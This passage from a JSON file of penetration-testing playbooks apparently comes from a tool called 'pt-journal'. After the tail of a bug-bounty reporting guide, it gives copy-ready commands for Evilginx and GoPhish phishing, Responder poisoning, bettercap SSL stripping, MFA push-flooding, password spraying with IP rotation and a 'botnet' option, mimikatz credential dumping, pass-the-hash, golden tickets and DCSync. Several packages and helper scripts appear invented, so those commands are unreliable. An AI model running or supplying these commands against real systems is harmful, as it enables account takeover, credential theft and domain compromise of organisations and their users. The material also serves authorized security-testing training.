            "command": "# Embed screenshots, logs, and supporting documentation"
          }
        ]
      },
      {
        "title": "Phase 5: Bounty Submission & Communication",
        "steps": [
          {
            "title": "Platform Formatting",
            "details": "Format report according to platform requirements",
            "command": "# Follow HackerOne, Bugcrowd, or program-specific formatting guidelines"
          },
          {
            "title": "Responsible Disclosure",
            "details": "Ensure responsible disclosure practices and ethical considerations",
            "command": "# Verify scope compliance, avoid data exfiltration, follow disclosure rules"
          },
          {
            "title": "Professional Communication",
            "details": "Maintain professional communication with program managers",
            "command": "# Be responsive, provide additional information, maintain professionalism"
          },
          {
            "title": "Follow-up & Validation",
            "details": "Follow up on remediation and validate fixes",
            "command": "# Test remediation, confirm fix, provide feedback on implementation"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Bug Bounty Reporting Timeline",
        "stages": [
          {
            "label": "Discovery Documentation",
            "description": "Document vulnerability discovery immediately with initial evidence",
            "command": "# Take initial screenshots, save PoC, note reproduction steps"
          },
          {
            "label": "Evidence Collection",
            "description": "Collect comprehensive evidence for vulnerability validation",
            "command": "# Capture traffic, logs, screenshots, and impact demonstration"
          },
          {
            "label": "CVSS Scoring",
            "description": "Calculate CVSS score and assess business impact",
            "command": "# Use CVSS calculator, assess impact, document risk assessment"
          },
          {
            "label": "Report Writing",
            "description": "Write comprehensive vulnerability report with remediation guidance",
            "command": "# Create executive summary, technical details, and remediation steps"
          },
          {
            "label": "Bounty Submission",
            "description": "Submit professional report to bug bounty program",
            "command": "# Format report, check scope compliance, submit professionally"
          }
        ]
      },
      {
        "name": "Rapid Vulnerability Reporting",
        "stages": [
          {
            "label": "Quick Evidence Capture",
            "description": "Quick capture of essential evidence for rapid reporting",
            "command": "# Screenshot vulnerability, save PoC, note reproduction steps"
          },
          {
            "label": "Impact Assessment",
            "description": "Rapid assessment of vulnerability impact and CVSS scoring",
            "command": "# Quick CVSS calculation, business impact assessment"
          },
          {
            "label": "Template-based Reporting",
            "description": "Use templates for rapid professional report generation",
            "command": "# Apply bug bounty template, customize for specific vulnerability"
          },
          {
            "label": "Professional Submission",
            "description": "Submit professional report with proper communication",
            "command": "# Format report, check scope compliance, submit with professionalism"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "CVSS score 9.0+ (Critical)",
        "meaning": "Critical vulnerability requiring immediate attention",
        "severity": "Critical"
      },
      {
        "indicator": "PII data exposure confirmed",
        "meaning": "Privacy violation and regulatory compliance issues",
        "severity": "High"
      },
      {
        "indicator": "Financial impact demonstrated",
        "meaning": "Direct financial loss or fraud potential",
        "severity": "High"
      },
      {
        "indicator": "Complete system compromise",
        "meaning": "Full system control and data access possible",
        "severity": "Critical"
      },
      {
        "indicator": "Limited user impact",
        "meaning": "Affects limited users or has minimal business impact",
        "severity": "Medium"
      },
      {
        "indicator": "Information disclosure only",
        "meaning": "Limited information disclosure with no direct exploitation",
        "severity": "Low"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom Report Templates",
        "scenario": "Develop custom report templates for specific vulnerability types",
        "command": "# Create Jinja2 templates for automated report generation",
        "notes": [
          "Standardize reporting quality and efficiency"
        ]
      },
      {
        "title": "Automated CVSS Scoring",
        "scenario": "Automate CVSS scoring based on vulnerability characteristics",
        "command": "# Create scripts to auto-calculate CVSS scores from vulnerability data",
        "notes": [
          "Ensure consistent and accurate CVSS scoring"
        ]
      },
      {
        "title": "Evidence Automation",
        "scenario": "Automate evidence collection and organization",
        "command": "# Create scripts to automatically organize evidence and generate reports",
        "notes": [
          "Streamline evidence management and reporting workflow"
        ]
      }
    ],
    "comparison_table": {
      "caption": "Bug Bounty Reporting Tools Comparison",
      "columns": ["Tool", "Templates", "CVSS", "Evidence Management", "Collaboration", "Best For"],
      "rows": [
        ["Dradis", "Excellent", "Good", "Excellent", "Excellent", "Team reporting"],
        ["Faraday", "Good", "Limited", "Good", "Excellent", "Collaborative testing"],
        ["Custom Scripts", "Good", "Excellent", "Good", "Limited", "Automation"],
        ["Manual", "Limited", "Good", "Limited", "Limited", "Simple reports"],
        ["Markdown", "Good", "Limited", "Limited", "Good", "Documentation"]
      ]
    },
    "resources": [
      {
        "label": "CVSS Calculator",
        "url": "https://www.first.org/cvss/calculator/3.1",
        "description": "Official CVSS v3.1 calculator for vulnerability scoring"
      },
      {
        "label": "HackerOne Disclosure Guidelines",
        "url": "https://hackerone.com/security",
        "description": "HackerOne vulnerability disclosure guidelines and best practices"
      },
      {
        "label": "Bugcrowd Vulnerability Rating Classification",
        "url": "https://www.bugcrowd.com/vulnerability-rating-taxonomy/",
        "description": "Bugcrowd vulnerability classification and rating system"
      },
      {
        "label": "OWASP Vulnerability Reporting Guide",
        "url": "https://owasp.org/www-project-vulnerability-reporting-/",
        "description": "OWASP guide to responsible vulnerability disclosure"
      }
    ]
  },
  {
    "id": "playbook_multi_stage_credential_harvesting",
    "name": "Multi-Stage Credential Harvesting",
    "summary": "Comprehensive credential harvesting playbook combining phishing infrastructure, credential theft, and multi-vector attacks with decision nodes and evidence collection.",
    "details": "This playbook orchestrates a sophisticated credential harvesting campaign using multiple attack vectors including phishing, credential dumping, and man-in-the-middle attacks. It includes decision trees for MFA bypass, lockout avoidance, and adaptive attack strategies based on target responses.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Phishing infrastructure and harvesting tools",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y gophish impacket-scripts responder bettercap",
            "copyable": true
          },
          {
            "detail": "docker run -d -p 80:80 -p 443:443 --name evilginx bkimminich/evilginx2",
            "copyable": true
          },
          {
            "detail": "pip3 install phishing-killer-creds",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/kgretzky/evilginx2.git && cd evilginx2 && make build",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Complete credential harvesting toolkit",
        "steps": [
          {
            "detail": "sudo apt install -y gophish impacket-scripts responder bettercap evilginx2",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/rapid7/metasploit-framework.git && cd metasploit-framework && ./msfconsole",
            "copyable": true
          },
          {
            "detail": "pip3 install creddump7 pymimikatz",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker",
        "summary": "Containerized phishing infrastructure",
        "steps": [
          {
            "detail": "docker pull gophish/gophish",
            "copyable": true
          },
          {
            "detail": "docker pull bkimminich/evilginx2",
            "copyable": true
          },
          {
            "detail": "docker run -d --network host -v $(pwd)/config:/opt/gophish/config gophish/gophish",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Quick phishing campaign setup",
        "command": "gophish -config config.json && python3 create_campaign.py",
        "notes": [
          "Ensure SSL certificates are properly configured"
        ]
      },
      {
        "description": "Responder LLMNR/NBT-NS poisoning",
        "command": "responder -I eth0 -w -f -d -v",
        "notes": [
          "Monitor for NTLMv2 hashes in real-time"
        ]
      }
    ],
    "step_sequences": [
      {
        "title": "Phase 1: Reconnaissance & Target Selection",
        "steps": [
          {
            "title": "OSINT for Credential Targets",
            "details": "Identify email formats, SSO providers, and MFA solutions",
            "command": "theHarvester -d target.com -l 500 -b linkedin,google -h && amass enum -d target.com -o domains.txt"
          },
          {
            "title": "MFA Detection",
            "details": "Determine MFA implementation and potential bypass vectors",
            "command": "curl -s https://login.target.com | grep -i 'mfa\\|2fa\\|authenticator\\|duo'"
          },
          {
            "title": "Email Template Analysis",
            "details": "Collect legitimate email templates for spoofing",
            "command": "mkdir -p ~/pt-journal-sessions/*/evidence/email_templates && save_email_samples.sh"
          }
        ]
      },
      {
        "title": "Phase 2: Phishing Infrastructure Setup",
        "steps": [
          {
            "title": "Evilginx Configuration",
            "details": "Set up reverse proxy for credential capture",
            "command": "evilginx2 -p ~/pt-journal-sessions/*/evidence/evilginx_phishlets"
          },
          {
            "title": "GoPhish Campaign Creation",
            "details": "Create targeted phishing campaign with tracking",
            "command": "gophish-cli create-campaign --name 'Targeted Campaign' --template template.json --url https://evil.target.com"
          },
          {
            "title": "SSL Certificate Setup",
            "details": "Generate legitimate-looking SSL certificates",
            "command": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/CN=target.com'"
          }
        ]
      },
      {
        "title": "Phase 3: Network-Based Credential Harvesting",
        "steps": [
          {
            "title": "Responder Deployment",
            "details": "Deploy LLMNR/NBT-NS poisoning for hash capture",
            "command": "responder -I eth0 -w -f -d -v -P -A > ~/pt-journal-sessions/*/evidence/responder_hashes.txt"
          },
          {
            "title": "Bettercap SSL Strip",
            "details": "Strip HTTPS to capture credentials in transit",
            "command": "bettercap -eval 'set arp.spoof.fullduplex true; set arp.spoof.targets 192.168.1.0/24; arp.spoof on; sslstrip on'"
          },
          {
            "title": "Network Sniffing",
            "details": "Capture authentication traffic",
            "command": "tshark -i eth0 -Y 'http.authbasic || http.request.method == POST' -w ~/pt-journal-sessions/*/evidence/auth_traffic.pcap"
          }
        ]
      },
      {
        "title": "Phase 4: Decision Nodes & Adaptation",
        "steps": [
          {
            "title": "MFA Bypass Assessment",
            "details": "Evaluate MFA bypass options based on captured data",
            "command": "python3 assess_mfa_bypass.py --hashes responder_hashes.txt --mfa-type duo"
          },
          {
            "title": "Lockout Monitoring",
            "details": "Monitor account lockouts and adjust timing",
            "command": "while true; do check_lockout_status.py --target-list targets.txt --delay 300; sleep 60; done"
          },
          {
            "title": "Push Fatigue Attack",
            "details": "If MFA detected, initiate push fatigue campaign",
            "command": "mfa-push-flood.py --target user@target.com --count 50 --delay 10"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "End-to-End Credential Harvesting Pipeline",
        "stages": [
          {
            "label": "Day 1: Reconnaissance",
            "description": "OSINT collection and target profiling",
            "command": "amass enum -d target.com -o ~/pt-journal-sessions/*/evidence/domains.txt && theHarvester -d target.com -b linkedin -l 500 > ~/pt-journal-sessions/*/evidence/emails.txt"
          },
          {
            "label": "Day 2: Infrastructure Setup",
            "description": "Deploy phishing infrastructure and SSL setup",
            "command": "docker-compose up -d evilginx gophish && setup_ssl.sh target.com"
          },
          {
            "label": "Day 3: Launch Campaign",
            "description": "Initiate phishing and network attacks",
            "command": "responder -I eth0 -w -f -d & gophish-cli launch-campaign --id 42"
          },
          {
            "label": "Day 4: Analysis & Adaptation",
            "description": "Analyze captured credentials and adapt strategy",
            "command": "python3 analyze_captures.py --session ~/pt-journal-sessions/*/evidence/ --report"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "NTLMv2 hash captured: user:domain:hash",
        "meaning": "Windows credential captured via network poisoning",
        "severity": "High"
      },
      {
        "indicator": "MFA push notification spam detected",
        "meaning": "Push fatigue attack successful, user may approve",
        "severity": "Medium"
      },
      {
        "indicator": "Clear-text credentials in POST data",
        "meaning": "Successful credential harvest via phishing",
        "severity": "Critical"
      },
      {
        "indicator": "Session cookie captured: session_id=...",
        "meaning": "Session hijacking opportunity available",
        "severity": "High"
      },
      {
        "indicator": "Account lockout threshold reached",
        "meaning": "Adjust attack timing or pivot to different vector",
        "severity": "Medium"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom Phishing Templates",
        "scenario": "Create highly targeted phishing templates for specific departments",
        "command": "python3 template_generator.py --company target.com --department finance --template-type invoice",
        "notes": [
          "Use recent legitimate emails as templates for authenticity"
        ]
      },
      {
        "title": "Evilginx Phishlet Development",
        "scenario": "Create custom phishlets for SaaS applications",
        "command": "evilginx2 phishlet create office365 && evilginx2 phishlet edit office365",
        "notes": [
          "Test phishlets thoroughly before deployment"
        ]
      },
      {
        "title": "Multi-Vector Coordination",
        "scenario": "Coordinate phishing with network attacks for maximum success",
        "command": "python3 coordinate_attacks.py --phishing-campaign 42 --network-attack responder --timing-sync",
        "notes": [
          "Ensure proper evidence collection coordination"
        ]
      }
    ],
    "comparison_table": {
      "caption": "Credential Harvesting Tools Comparison",
      "columns": ["Tool", "Type", "MFA Bypass", "Stealth", "Evidence Quality"],
      "rows": [
        ["GoPhish", "Email Phishing", "No", "Medium", "High"],
        ["Evilginx2", "Reverse Proxy", "Yes", "High", "Very High"],
        ["Responder", "Network Poisoning", "No", "Low", "Medium"],
        ["Bettercap", "MITM", "Partial", "Medium", "High"],
        ["Custom Scripts", "Multi-vector", "Yes", "Variable", "Variable"]
      ]
    },
    "resources": [
      {
        "label": "Legal Compliance Guidelines",
        "url": "https://www.isaca.org/resources/news-and-trends/isaca-now-blog/2020/legal-considerations-for-penetration-testing",
        "description": "Legal requirements and authorization for credential testing"
      },
      {
        "label": "Evilginx2 Documentation",
        "url": "https://github.com/kgretzky/evilginx2/blob/master/README.md",
        "description": "Complete guide to Evilginx2 setup and phishlet development"
      },
      {
        "label": "GoPhish User Guide",
        "url": "https://getgophish.com/documentation/",
        "description": "Official documentation for GoPhish campaign management"
      }
    ]
  },
  {
    "id": "playbook_credential_spraying_brute_force",
    "name": "Credential Spraying & Brute Force",
    "summary": "Advanced credential attack playbook with lockout avoidance techniques, adaptive timing, and multi-platform brute force strategies.",
    "details": "This playbook implements sophisticated credential attacks including password spraying, brute force attacks, and hybrid approaches. It focuses on lockout avoidance, timing optimization, and adaptive strategies based on target responses. Includes decision trees for pivot strategies and evidence collection.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Brute force and password attack tools",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y hydra medusa ncrack patator john hashcat",
            "copyable": true
          },
          {
            "detail": "pip3 install crowbar bruteforce-luks",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/danielmiessler/SecLists.git && cd SecLists && git pull",
            "copyable": true
          },
          {
            "detail": "wget https://github.com/hashcat/hashcat/archive/v6.2.6.tar.gz && tar -xzf v6.2.6.tar.gz",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Complete password attack toolkit",
        "steps": [
          {
            "detail": "sudo apt install -y hydra medusa ncrack patator john hashcat crowbar",
            "copyable": true
          },
          {
            "detail": "apt install -y seclists wordlists crunch cewl",
            "copyable": true
          },
          {
            "detail": "pip3 install spraybreaker credmap",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker",
        "summary": "Containerized brute force infrastructure",
        "steps": [
          {
            "detail": "docker pull hashcat/hashcat",
            "copyable": true
          },
          {
            "detail": "docker pull securecodewarrior/docker-hydra",
            "copyable": true
          },
          {
            "detail": "docker run -v $(pwd)/wordlists:/wordlists -v $(pwd)/results:/results hashcat/hashcat",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Password spraying with common passwords",
        "command": "spraybreaker -t targets.txt -p passwords.txt --delay 3600 --lockout-threshold 3",
        "notes": [
          "Adjust delay based on observed lockout policies"
        ]
      },
      {
        "description": "Hydra SSH brute force with user list",
        "command": "hydra -L users.txt -P passwords.txt ssh://target.com -o ~/pt-journal-sessions/*/evidence/hydra_ssh.txt",
        "notes": [
          "Use VPN and rotate source IPs to avoid detection"
        ]
      }
    ],
    "step_sequences": [
      {
        "title": "Phase 1: Password Policy Analysis",
        "steps": [
          {
            "title": "Lockout Policy Detection",
            "details": "Determine account lockout thresholds and duration",
            "command": "python3 lockout_test.py --target target.com --user testuser --delay 900"
          },
          {
            "title": "Password Complexity Analysis",
            "details": "Analyze password requirements and patterns",
            "command": "crackmapexec smb target.com --pass-pol | grep -E 'Password|Complexity|Length'"
          },
          {
            "title": "User Enumeration",
            "details": "Identify valid user accounts for targeted attacks",
            "command": "enum4linux -U target.com > ~/pt-journal-sessions/*/evidence/user_enum.txt"
          }
        ]
      },
      {
        "title": "Phase 2: Wordlist Preparation",
        "steps": [
          {
            "title": "Target-Specific Wordlist Generation",
            "details": "Create custom wordlists based on target information",
            "command": "cewl -d 5 -m 8 -w ~/pt-journal-sessions/*/evidence/target_words.txt https://target.com"
          },
          {
            "title": "Password Pattern Analysis",
            "details": "Generate passwords based on observed patterns",
            "command": "python3 pattern_generator.py --base target.com --year 2024 --patterns common_patterns.txt"
          },
          {
            "title": "Wordlist Deduplication",
            "details": "Remove duplicates and optimize wordlist size",
            "command": "cat *.txt | sort | uniq > ~/pt-journal-sessions/*/evidence/final_wordlist.txt"
          }
        ]
      },
      {
        "title": "Phase 3: Credential Spraying",
        "steps": [
          {
            "title": "Low-Frequency Password Testing",
            "details": "Test common passwords with extended delays",
            "command": "spraybreaker -t targets.txt -p top1000.txt --delay 7200 --lockout-threshold 3 --output spray_results.txt"
          },
          {
            "title": "Seasonal Password Testing",
            "details": "Test seasonal and event-based passwords",
            "command": "python3 seasonal_spray.py --targets targets.txt --season winter --delay 3600"
          },
          {
            "title": "Success Rate Monitoring",
            "details": "Monitor success rates and adjust strategy",
            "command": "while true; do tail -f spray_results.txt | grep SUCCESS && break; sleep 300; done"
          }
        ]
      },
      {
        "title": "Phase 4: Adaptive Brute Force",
        "steps": [
          {
            "title": "Service-Specific Attacks",
            "details": "Launch brute force attacks against exposed services",
            "command": "hydra -L users.txt -P passwords.txt -M services.txt -o ~/pt-journal-sessions/*/evidence/hydra_multi.txt"
          },
          {
            "title": "Rate Limiting Evasion",
            "details": "Rotate source IPs and use timing variations",
            "command": "python3 rotate_attack.py --targets targets.txt --proxy-list proxies.txt --delay-variance 300"
          },
          {
            "title": "Pivot Strategy Execution",
            "details": "Pivot to alternative methods based on results",
            "command": "python3 pivot_strategy.py --results spray_results.txt --next-phase credential_dumping"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Multi-Vector Credential Attack Pipeline",
        "stages": [
          {
            "label": "Day 1: Reconnaissance",
            "description": "Password policy analysis and user enumeration",
            "command": "crackmapexec smb target.com --pass-pol > ~/pt-journal-sessions/*/evidence/pass_policy.txt && enum4linux -U target.com > ~/pt-journal-sessions/*/evidence/users.txt"
          },
          {
            "label": "Day 2: Wordlist Development",
            "description": "Generate target-specific wordlists and patterns",
            "command": "cewl -d 10 -m 8 https://target.com > ~/pt-journal-sessions/*/evidence/cewl_words.txt && python3 pattern_gen.py --target target.com"
          },
          {
            "label": "Day 3-5: Password Spraying",
            "description": "Execute low-frequency password spraying with lockout avoidance",
            "command": "spraybreaker -t targets.txt -p passwords.txt --delay 14400 --monitor-lockouts"
          },
          {
            "label": "Day 6-7: Brute Force",
            "description": "Targeted brute force against high-value accounts",
            "command": "hydra -L vip_users.txt -P custom_passwords.txt -M ssh_targets.txt -o ~/pt-journal-sessions/*/evidence/hydra_vip.txt"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Account lockout detected for user@target.com",
        "meaning": "Password policy threshold reached, adjust timing",
        "severity": "Medium"
      },
      {
        "indicator": "Successful authentication: user:password",
        "meaning": "Valid credentials obtained, document and pivot",
        "severity": "Critical"
      },
      {
        "indicator": "Rate limiting detected from source IP",
        "meaning": "Rotate source IP or adjust attack timing",
        "severity": "Medium"
      },
      {
        "indicator": "MFA prompt triggered during login",
        "meaning": "Credentials valid but MFA blocks access, pivot to MFA bypass",
        "severity": "High"
      },
      {
        "indicator": "Account temporarily suspended",
        "meaning": "Attack detected, cease activities and pivot to alternative vector",
        "severity": "High"
      }
    ],
    "advanced_usage": [
      {
        "title": "Adaptive Timing Algorithms",
        "scenario": "Implement machine learning for optimal attack timing",
        "command": "python3 adaptive_timing.py --historical-data results.db --optimize success_rate",
        "notes": [
          "Train on previous engagement data for better timing optimization"
        ]
      },
      {
        "title": "Distributed Attack Coordination",
        "scenario": "Coordinate attacks across multiple source IPs",
        "command": "python3 distributed_spray.py --botnet nodes.txt --targets targets.txt --coordinator primary",
        "notes": [
          "Ensure proper evidence aggregation from distributed nodes"
        ]
      },
      {
        "title": "Custom Protocol Modules",
        "scenario": "Develop modules for proprietary authentication protocols",
        "command": "python3 protocol_dev.py --template custom_auth --target-system internal_app",
        "notes": [
          "Test modules thoroughly against development environments"
        ]
      }
    ],
    "comparison_table": {
      "caption": "Brute Force Tools Comparison",
      "columns": ["Tool", "Protocols", "Speed", "Stealth", "Customization"],
      "rows": [
        ["Hydra", "40+ protocols", "High", "Low", "Medium"],
        ["Medusa", "20+ protocols", "Medium", "Medium", "High"],
        ["Ncrack", "Network focus", "High", "Medium", "High"],
        ["Patator", "Scriptable", "Variable", "High", "Very High"],
        ["Custom Scripts", "Any", "Variable", "Very High", "Complete"]
      ]
    },
    "resources": [
      {
        "label": "Password Policy Testing Framework",
        "url": "https://github.com/AlessandroZ/Password-Policy-Testing",
        "description": "Comprehensive password policy analysis tools"
      },
      {
        "label": "Legal Authorization Template",
        "url": "https://www.sans.org/white-papers/36842/",
        "description": "Authorization templates for credential testing"
      },
      {
        "label": "OWASP Password Attack Guidelines",
        "url": "https://owasp.org/www-community/attacks/Password_Attacks",
        "description": "OWASP guidelines for password attack testing"
      }
    ]
  },
  {
    "id": "playbook_hash_cracking_pass_the_hash",
    "name": "Hash Cracking & Pass-the-Hash Chains",
    "summary": "Advanced hash cracking and lateral movement playbook covering hash extraction, cracking techniques, and pass-the-hash attack chains.",
    "details": "This playbook provides comprehensive coverage of hash extraction from multiple sources, advanced cracking techniques with GPU optimization, and pass-the-hash attack chains for lateral movement. Includes decision trees for hash type identification, cracking strategy selection, and pivot opportunities.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Hash cracking and extraction tools",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y hashcat john johntheripper hashid",
            "copyable": true
          },
          {
            "detail": "pip3 install creddump7 pymimikatz secretsdump",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/mimikatz/mimikatz.git && cd mimikatz && make",
            "copyable": true
          },
          {
            "detail": "wget https://github.com/hashcat/hashcat/releases/download/v6.2.6/hashcat-6.2.6.7z && 7z x hashcat-6.2.6.7z",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Complete hash cracking toolkit",
        "steps": [
          {
            "detail": "sudo apt install -y hashcat hashcat-utils john johntheripper mimikatz",
            "copyable": true
          },
          {
            "detail": "apt install -y creddump7 samdump2 pwdump fgdump",
            "copyable": true
          },
          {
            "detail": "pip3 install impacket bloodhound",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker",
        "summary": "GPU-optimized hash cracking containers",
        "steps": [
          {
            "detail": "docker pull hashcat/hashcat",
            "copyable": true
          },
          {
            "detail": "docker run --gpus all -v $(pwd)/hashes:/hashes -v $(pwd)/wordlists:/wordlists hashcat/hashcat",
            "copyable": true
          },
          {
            "detail": "docker pull danielmiessler/john:latest",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Quick hash identification",
        "command": "hashid ~/pt-journal-sessions/*/evidence/captured_hashes.txt",
        "notes": [
          "Identify hash types before selecting cracking strategy"
        ]
      },
      {
        "description": "Hashcat GPU cracking",
        "command": "hashcat -m 1000 -a 0 -w 4 -O hashes.txt wordlists/rockyou.txt",
        "notes": [
          "Use -O for optimized performance on supported hash types"
        ]
      }
    ],
    "step_sequences": [
      {
        "title": "Phase 1: Hash Extraction",
        "steps": [
          {
            "title": "Memory Dump Collection",
            "details": "Extract hashes from memory using Mimikatz",
            "command": "mimikatz \"sekurlsa::logonpasswords\" \"exit\" > ~/pt-journal-sessions/*/evidence/lsass_hashes.txt"
          },
          {
            "title": "SAM Database Extraction",
            "details": "Dump SAM and SYSTEM files for offline analysis",
            "command": "reg save HKLM\\SAM sam.save && reg save HKLM\\SYSTEM system.save && python3 secretsdump.py -sam sam.save -system system.save LOCAL"
          },
          {
            "title": "NTDS.dit Extraction",
            "details": "Extract Active Directory database for domain hashes",
            "command": "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full C:\\temp\" \"q q\""
          },
          {
            "title": "Network Hash Capture",
            "details": "Capture hashes via network poisoning",
            "command": "responder -I eth0 -w -f -v -P -A > ~/pt-journal-sessions/*/evidence/network_hashes.txt"
          }
        ]
      },
      {
        "title": "Phase 2: Hash Analysis & Classification",
        "steps": [
          {
            "title": "Hash Type Identification",
            "details": "Classify captured hashes by type and complexity",
            "command": "python3 hash_analyzer.py --input ~/pt-journal-sessions/*/evidence/all_hashes.txt --output hash_classification.json"
          },
          {
            "title": "Password Policy Correlation",
            "details": "Correlate hashes with observed password policies",
            "command": "python3 policy_correlation.py --hashes hashes.txt --policy password_policy.txt"
          },
          {
            "title": "Cracking Priority Assignment",
            "details": "Prioritize hashes based on user roles and access levels",
            "command": "python3 prioritize_hashes.py --hashes hashes.txt --user-roles domain_admins.txt --output priority_hashes.txt"
          }
        ]
      },
      {
        "title": "Phase 3: Advanced Hash Cracking",
        "steps": [
          {
            "title": "Dictionary Attacks",
            "details": "Launch optimized dictionary attacks with custom wordlists",
            "command": "hashcat -m 1000 -a 0 -w 4 -O -r rules/best64.rule priority_hashes.txt wordlists/custom.txt"
          },
          {
            "title": "Rule-Based Attacks",
            "details": "Apply complex password transformation rules",
            "command": "hashcat -m 1000 -a 0 -w 4 -O -r rules/d3ad0ne.rule -r rules/T0XlC.rule priority_hashes.txt wordlists/rockyou.txt"
          },
          {
            "title": "Mask Attacks",
            "details": "Targeted attacks based on password patterns",
            "command": "hashcat -m 1000 -a 3 -w 4 -O ?u?l?l?l?l?d?d?d?d high_value_hashes.txt"
          },
          {
            "title": "Hybrid Attacks",
            "details": "Combine dictionary and mask attacks for complex passwords",
            "command": "hashcat -m 1000 -a 6 -w 4 -O -1 ?u?d?s wordlists/company_names.txt ?1?1?1?1?d?d?d?d"
          }
        ]
      },
      {
        "title": "Phase 4: Pass-the-Hash Attack Chains",
        "steps": [
          {
            "title": "PTH Windows Authentication",
            "details": "Use cracked hashes for Windows authentication",
            "command": "python3 pth_attack.py --hash NTLM_hash --target target.domain.com --service smb"
          },
          {
            "title": "Lateral Movement with Impacket",
            "details": "Move laterally using pass-the-hash techniques",
            "command": "psexec.py -hashes :NTLM_hash domain/user@target.domain.com 'whoami'"
          },
          {
            "title": "Golden Ticket Creation",
            "details": "Create Kerberos golden tickets for persistence",
            "command": "mimikatz \"kerberos::golden /user:administrator /domain:domain.com /sid:S-1-5-21-... /krbtgt:krbtgt_hash /ticket:golden.kirbi\""
          },
          {
            "title": "Domain Controller DCSync",
            "details": "Extract all domain hashes via DCSync attack",
            "command": "mimikatz \"lsadump::dcsync /domain:domain.com /all /csv\""
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Enterprise Hash Cracking Pipeline",
        "stages": [
          {
            "label": "Day 1: Hash Collection",
            "description": "Extract hashes from multiple sources",
            "command": "mimikatz \"sekurlsa::logonpasswords\" > ~/pt-journal-sessions/*/evidence/memory_hashes.txt && responder -I eth0 -w -f -v > ~/pt-journal-sessions/*/evidence/network_hashes.txt"
          },
          {
            "label": "Day 2: Hash Classification",
            "description": "Analyze and prioritize captured hashes",
            "command": "python3 classify_hashes.py --input ~/pt-journal-sessions/*/evidence/ --output ~/pt-journal-sessions/*/evidence/priority.txt"
          },
          {
            "label": "Day 3-5: GPU Cracking",
            "description": "Intensive GPU-based hash cracking",
            "command": "hashcat -m 1000 -a 0 -w 4 -O -r rules/comprehensive.rule priority.txt wordlists/enterprise.txt"
          },
          {
            "label": "Day 6: PTH Attacks",
            "description": "Leverage cracked hashes for lateral movement",
            "command": "python3 pth_campaign.py --cracked cracked_hashes.txt --target-network 192.168.1.0/24"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "NTLM hash cracked: user:password",
        "meaning": "Valid credentials obtained, immediate lateral movement possible",
        "severity": "Critical"
      },
      {
        "indicator": "Kerberos ticket granted: TGS for service/server",
        "meaning": "Successful pass-the-ticket authentication achieved",
        "severity": "High"
      },
      {
        "indicator": "Golden ticket created successfully",
        "meaning": "Domain-level persistence and unrestricted access achieved",
        "severity": "Critical"
      },
      {
        "indicator": "DCSync rights obtained",
        "meaning": "Ability to extract all domain credentials",
        "severity": "Critical"
      },
      {
        "indicator": "Hash type: bcrypt (cost: 12)",
        "meaning": "High-cost hash, requires significant GPU resources",
        "severity": "Medium"
      }
    ],
    "advanced_usage": [
      {
        "title": "Distributed Hash Cracking",
        "scenario": "Coordinate multiple GPU rigs for large-scale cracking",
        "command": "python3 distributed_crack.py --master rig1 --workers rig2,rig3,rig4 --hashes enterprise_hashes.txt",
        "notes": [
          "Ensure proper hash distribution and result aggregation"
        ]
      },
      {
        "title": "Custom Rule Development",
        "scenario": "Develop organization-specific password rules",
        "command": "hashcat --stdout -r custom.rules wordlist.txt | hashcat -m 1000 -a 0 hashes.txt",
        "notes": [
          "Analyze cracked passwords to identify patterns for rule optimization"
        ]
      },
      {
        "title": "Cloud GPU Integration",
        "scenario": "Leverage cloud GPU instances for burst cracking",
        "command": "aws ec2 run-instances --instance-type p3.2xlarge --image-id ami-hashcat --user-data startup.sh",
        "notes": [
          "Consider cost implications and data security for cloud cracking"
        ]
      }
    ],
    "comparison_table": {
      "caption": "Hash Cracking Tools Comparison",
      "columns": ["Tool", "Hash Types", "GPU Support", "Speed", "Features"],
      "rows": [
        ["Hashcat", "300+ types", "Excellent", "Very High", "Advanced rules, distributed"],
        ["John the Ripper", "250+ types", "Good", "High", "Rule engine, session management"],
        ["Mimikatz", "Windows only", "N/A", "N/A", "Live memory extraction, PTH"],
        ["Hash Identifier", "100+ types", "N/A", "N/A", "Hash classification only"],
        ["Custom Scripts", "Any", "Variable", "Variable", "Specialized algorithms"]
      ]
    },
    "resources": [
      {
        "label": "Hashcat Wiki",
        "url": "https://hashcat.net/wiki/",
        "description": "Comprehensive hashcat documentation and hash types"
      },
      {
        "label": "Mimikatz Official Guide",
        "url": "https://github.com/gentilkiwi/mimikatz/wiki",
        "description": "Complete guide to Mimikatz features and techniques"
      },
      {
        "label": "Pass-the-Hash Whitepaper",
        "url": "https://www.sans.org/white-papers/36845/",
